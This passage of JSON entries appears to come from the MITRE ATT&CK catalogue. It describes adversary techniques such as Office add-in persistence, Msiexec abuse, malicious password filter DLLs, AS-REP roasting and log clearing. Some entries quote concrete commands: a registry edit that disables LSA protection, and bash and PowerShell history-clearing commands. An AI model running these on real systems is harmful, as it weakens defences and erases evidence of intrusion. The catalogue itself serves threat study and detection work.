  "attack-pattern--34f1d81d-fe88-4f97-bd3b-a3164536255d": {
    "name": "Add-ins",
    "example_uses": [
      "has been loaded through a `.wll` extension added to the ` %APPDATA%\\microsoft\\word\\startup\\` repository.",
      "has used the RoyalRoad exploit builder to drop a second stage loader intel.wll into the Word Startup folder on the compromised host.",
      "has the ability to use Microsoft Outlook add-ins to establish persistence.",
      "has the ability to use Outlook add-ins for persistence."
    ],
    "description": "Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. ",
    "similar_words": [
      "Add-ins"
    ],
    "id": "T1137.006"
  },
  "attack-pattern--35187df2-31ed-43b6-a1f5-2f1d3d58d3f1": {
    "name": "Transport Agent",
    "example_uses": [
      "has used a malicious Microsoft Exchange transport agent for persistence."
    ],
    "description": "Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. ",
    "similar_words": [
      "Transport Agent"
    ],
    "id": "T1505.002"
  },
  "attack-pattern--356662f7-e315-4759-86c9-6214e2a50ff8": {
    "name": "AppDomainManager",
    "example_uses": [
      "is executed via the AppDomainManager injection technique."
    ],
    "description": "Adversaries may execute their own malicious payloads by hijacking how the .NET `AppDomainManager` loads assemblies. The .NET framework uses the `AppDomainManager` class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run as .NET code) may be loaded into an application domain as executable code.(Citation: Microsoft App Domains) Known as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (`.config`) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.(Citation: PenTestLabs AppDomainManagerInject)(Citation: PwC Yellow Liderc)(Citation: Rapid7 AppDomain Manager Injection)",
    "similar_words": [
      "AppDomainManager"
    ],
    "id": "T1574.014"
  },
  "attack-pattern--359b00ad-9425-420b-bba5-6de8d600cbc0": {
    "name": "Remote Data Staging",
    "example_uses": [
      "has staged stolen data on designated servers in the target environment.",
      "has copied files to a remote machine infected with  or another backdoor.",
      "During the   staged data and files in password-protected archives on a victim's OWA server.",
      "has staged data on remote MSP systems or other victim networks prior to exfiltration.",
      "aggregates staged data from a network into a single location.",
      "has staged data remotely prior to exfiltration.",
      "has staged archives of collected data on a target's Outlook Web Access (OWA) server.",
      "has used plugins to save captured screenshots to `.\\AActdata\\` on an SMB share.",
      "manually transferred collected files to an exfiltration host using xcopy.",
      "actors have compressed data from remote systems and moved it to another staging system before exfiltration.",
      "During  threat actors copied files to company web servers and subsequently downloaded them.",
      "has moved staged encrypted archives to Internet-facing servers that had previously been compromised with  prior to exfiltration.",
      "staged collected email archives in the public web directory of a website that was accessible from the internet."
    ],
    "description": "Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",
    "similar_words": [
      "Remote Data Staging"
    ],
    "id": "T1074.002"
  },
  "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64": {
    "name": "Additional Container Cluster Roles",
    "example_uses": [],
    "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC) This account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  Note that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
    "similar_words": [
      "Additional Container Cluster Roles"
    ],
    "id": "T1098.006"
  },
  "attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336": {
    "name": "Msiexec",
    "example_uses": [
      "has used .MSI files as an initial way to start the infection chain.",
      "has used msiexec.exe to execute an MSI payload.",
      "has used msiexec to execute malicious Windows Installer packages. Additionally a PROPERTY=VALUE pair containing a 56-bit encryption key has been used to decrypt the main payload from the installer packages.",
      "has used MsiExec.exe to automatically execute files.",
      "can use `msiexec.exe` for execution of malicious DLL.",
      "can inject itself into a suspended msiexec.exe process to send beacons to C2 while appearing as a normal msi application.",
      "has been installed via MSI installer.",
      "has the ability to execute inside the msiexec.exe process.",
      "has used msiexec to download and execute malicious Windows Installer files.",
      "can use MSI files with embedded VBScript for execution.",
      "can use MSIExec to spawn multiple cmd.exe processes.",
      "can use MSI files to execute DLLs.",
      "has been installed via MSI installer.",
      "has used the MSI installer to download and execute malicious payloads.",
      "has been delivered as an unsigned MSI package that was executed with msiexec.exe.",
      "has used msiexec to download and execute malicious installer files over HTTP.",
      "has used the msiexec.exe command-line utility to download and execute malicious MSI files.",
      "has used msiexec to install the  malware.",
      "used an MSI installer to install the virtualization software.",
      "has delivered components for its ransomware attacks using MSI files some of which have been executed from the command-line using msiexec.",
      "can use Msiexec to install a service.",
      "has been installed via `msiexec.exe`.",
      "can use msiexec.exe to disable security tools on the system.",
      "has called `msiexec` to install remotely-hosted MSI files.",
      "can inject itself into a suspended msiexec.exe process to send beacons to C2 while appearing as a normal msi application.   has also used msiexec.exe to deploy the  loader.",
      "uses msiexec.exe for post-installation communication to command and control infrastructure. Msiexec.exe is executed referencing a remote resource for second-stage payload retrieval and execution.",
      "initial payloads downloaded a Windows Installer MSI file that in turn dropped follow-on files leading to installation of  during .",
      "has used `msiexec.exe` to execute malicious files."
    ],
    "description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the AlwaysInstallElevated policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",
    "similar_words": [
      "Msiexec"
    ],
    "id": "T1218.007"
  },
  "attack-pattern--36aa137f-5166-41f8-b2f0-a4cfa1b4133e": {
    "name": "Network Trust Dependencies",
    "example_uses": [],
    "description": "Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
    "similar_words": [
      "Network Trust Dependencies"
    ],
    "id": "T1590.003"
  },
  "attack-pattern--36b2a1d7-e09e-49bf-b45e-477076c2ec01": {
    "name": "Reflection Amplification",
    "example_uses": [],
    "description": "Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017) This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)",
    "similar_words": [
      "Reflection Amplification"
    ],
    "id": "T1498.002"
  },
  "attack-pattern--3731fbcd-0e43-47ae-ae6c-d15e510f0d42": {
    "name": "Password Filter DLL",
    "example_uses": [
      "harvests plain-text credentials as a password filter registered on domain controllers.",
      "has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to acquire credentials any time a domain local user or administrator logs in or changes a password.",
      "has registered a password filter DLL in order to drop malware."
    ],
    "description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)",
    "similar_words": [
      "Password Filter DLL"
    ],
    "id": "T1556.002"
  },
  "attack-pattern--379809f6-2fac-42c1-bd2e-e9dee70b27f8": {
    "name": "Terminal Services DLL",
    "example_uses": [],
    "description": "Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop Services)[Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a \"generic\" process (ex: svchost.exe) load the service's DLL file, the location of which is stored in a Registry entry named ServiceDll.(Citation: Microsoft System Services Fundamentals) The termsrv.dll file, typically stored in `%SystemRoot%\\System32\\`, is the default ServiceDll value for Terminal Services in `HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\`.Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.(Citation: James TermServ DLL) Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal termsrv.dll functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the termsrv.dll file or modifying the ServiceDll value to point to a DLL that provides increased RDP functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",
    "similar_words": [
      "Terminal Services DLL"
    ],
    "id": "T1505.005"
  },
  "attack-pattern--37b11151-1776-4f8f-b328-30939fbf2ceb": {
    "name": "AppleScript",
    "example_uses": [
      "uses AppleScript to create a login item for persistence.",
      "uses 's osascript -e command to launch 's persistence via  and .",
      "can use AppleScript to inject malicious JavaScript into a browser.",
      "has used `osascript` to call itself via the `do shell script` command in the  `.plist` file.",
      "can use osascript to generate a password-stealing prompt duplicate files and folders and set environmental variables."
    ],
    "description": "Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.Scripts can be run from the command-line via osascript /path/to/script or osascript -e \"script here\". Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding #!/usr/bin/osascript to the start of the script file.(Citation: SentinelOne AppleScript)AppleScripts do not need to call osascript to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)sNSAppleScriptorOSAScript, both of which execute code independent of the /usr/bin/osascript command line utility.Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs)",
    "similar_words": [
      "AppleScript"
    ],
    "id": "T1059.002"
  },
  "attack-pattern--38eb0c22-6caf-46ce-8869-5964bd735858": {
    "name": "Service Exhaustion Flood",
    "example_uses": [],
    "description": "Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)",
    "similar_words": [
      "Service Exhaustion Flood"
    ],
    "id": "T1499.002"
  },
  "attack-pattern--39131305-9282-45e4-ac3b-591d2d4fc3ef": {
    "name": "Compromise Hardware Supply Chain",
    "example_uses": [],
    "description": "Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",
    "similar_words": [
      "Compromise Hardware Supply Chain"
    ],
    "id": "T1195.003"
  },
  "attack-pattern--3975dbb5-0e1e-4f5b-bae1-cf2ab84b46dc": {
    "name": "Clear Network Connection History and Configurations",
    "example_uses": [
      "also removed the firewall rules it created during execution.",
      "have inspected server logs to remove their IPs.",
      "has inspected server logs to remove their IPs."
    ],
    "description": "Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.Network connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):* HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default* HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\ServersWindows may also store information about recent RDP connections in files such as C:\\Users\\\\%username%\\Documents\\Default.rdp and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\TerminalServer Client\\Cache\\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)Malicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",
    "similar_words": [
      "Clear Network Connection History and Configurations"
    ],
    "id": "T1070.007"
  },
  "attack-pattern--3986e7fd-a8e9-4ecb-bfc6-55920855912b": {
    "name": "AS-REP Roasting",
    "example_uses": [
      "can reveal the credentials of accounts that have Kerberos pre-authentication disabled through AS-REP roasting."
    ],
    "description": "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) Preauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the users password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the users password.(Citation: Microsoft Kerberos Preauth 2014)For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
    "similar_words": [
      "AS-REP Roasting"
    ],
    "id": "T1558.004"
  },
  "attack-pattern--39cc9f64-cf74-4a48-a4d8-fe98c54a02e0": {
    "name": "Virtual Private Server",
    "example_uses": [
      "has used the VPS infrastructure of compromised Iranian threat actors.",
      "has compromised Virtual Private Servers (VPS) to proxy C2 traffic.",
      "During  threat actors abused Virtual Private Servers to store malicious files."
    ],
    "description": "Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig)Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",
    "similar_words": [
      "Virtual Private Server"
    ],
    "id": "T1584.003"
  },
  "attack-pattern--3a32740a-11b0-4bcf-b0a9-3abd0f6d3cd5": {
    "name": "AutoHotKey & AutoIT",
    "example_uses": [
      "has been distributed through an AutoIt loader script.",
      "has utilized AutoIt malware scripts embedded in Microsoft Office documents or malicious links.",
      "uses AutoIt scripts dropped to a hidden directory during initial installation phases such as `test.au3`.",
      "was developed using the AutoIT scripting language.",
      "has utilized AutoIt malware scripts and AutoIt executables.",
      "can use an AutoIT script to decrypt a payload file load it into victim memory then execute it on the victim machine."
    ],
    "description": "Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.(Citation: AutoIT)(Citation: AutoHotKey)Adversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as [Phishing](https://attack.mitre.org/techniques/T1566) payloads.(Citation: Splunk DarkGate)These scripts may also be compiled into self-contained executable payloads (`.exe`).(Citation: AutoIT)(Citation: AutoHotKey)",
    "similar_words": [
      "AutoHotKey & AutoIT"
    ],
    "id": "T1059.010"
  },
  "attack-pattern--3a40f208-a9c1-4efa-a598-4003c3681fb8": {
    "name": "Reduce Key Space",
    "example_uses": [],
    "description": "Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.(Citation: Cisco Synful Knock Evolution)Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.Adversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601) to change the configuration of the device. (Citation: Cisco Blog Legacy Device Attacks)",
    "similar_words": [
      "Reduce Key Space"
    ],
    "id": "T1600.001"
  },
  "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a": {
    "name": "Clear Command History",
    "example_uses": [
      "has cleared command history with history -c.",
      "can remove all command history on compromised hosts.",
      "has used history -c to clear script shell logs.",
      "has used  to remove PowerShell execution logs.",
      "has removed mailbox export requests from compromised Exchange servers.",
      "has routinely deleted log files on a compromised router including automatic log deletion through the use of the logrotate utility.",
      "has cleared the command history on targeted ESXi servers.",
      "attempted to remove evidence of some of its activity by deleting Bash histories.",
      "cleared command history in Linux environments to remove traces of activity after operations.",
      "can overwrite previously executed command line arguments."
    ],
    "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Adversaries may delete their commands from these logs by manually clearing the history (history -c) or deleting the bash history file rm ~/.bash_history.  Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (clear logging and/or clear history).(Citation: US-CERT-TA18-106A) On ESXi servers, command history may be manually removed from the `/var/log/shell.log` file.(Citation: Broadcom ESXi Shell Audit)On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the PSReadLine module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.The PSReadLine command history tracks the commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)Adversaries may run the PowerShell command Clear-History to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the ConsoleHost_history.txt file. Adversaries may also delete the ConsoleHost_history.txt file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
    "similar_words": [
      "Clear Command History"
    ],
    "id": "T1070.003"
  },
  "attack-pattern--3d1b9d7e-3921-4d25-845a-7d9f15c0da44": {
    "name": "Outlook Rules",
    "example_uses": [
      "can be used to automate the abuse of Outlook Rules to establish persistence."
    ],
    "description": "Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules)Once malicious rules have been added to the users mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)",
    "similar_words": [
      "Outlook Rules"
    ],
    "id": "T1137.005"
  },
  "attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529": {
    "name": "Impair Defenses",
    "example_uses": [
      "reduces the integrity level of objects to allow write actions.",
      "has disabled LSA protection on compromised hosts using `reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f`.",
      "can modify proprietary Fortinet logs on victim machines.",
      "removed Kernel Notify Routines to bypass endpoint detection and response (EDR) products.",
      "can impair logging on all devices used along its connection path to compromised hosts."
    ],
    "description": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)",
    "similar_words": [
      "Impair Defenses"
    ],
    "id": "T1562"
  },
  "attack-pattern--3d52e51e-f6db-4719-813c-48002a99f43a": {
    "name": "Cloud Accounts",
    "example_uses": [
      "has used residential proxies including Azure Virtual Machines to obfuscate their access to victim environments.",
      "used compromised Google Workspace accounts for command and control."
    ],
    "description": "Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Additionally, cloud-based messaging services such as Twilio, SendGrid, AWS End User Messaging, AWS SNS (Simple Notification Service), or AWS SES (Simple Email Service) may be leveraged for spam or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)(Citation: Netcraft SendGrid 2024) Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)A variety of methods exist for compromising cloud accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, conducting [Password Spraying](https://attack.mitre.org/techniques/T1110/003) attacks, or attempting to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: MSTIC Nobelium Oct 2021) Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) between service providers and their customers.(Citation: MSTIC Nobelium Oct 2021)",
    "similar_words": [
      "Cloud Accounts"
    ],
    "id": "T1586.003"
  },
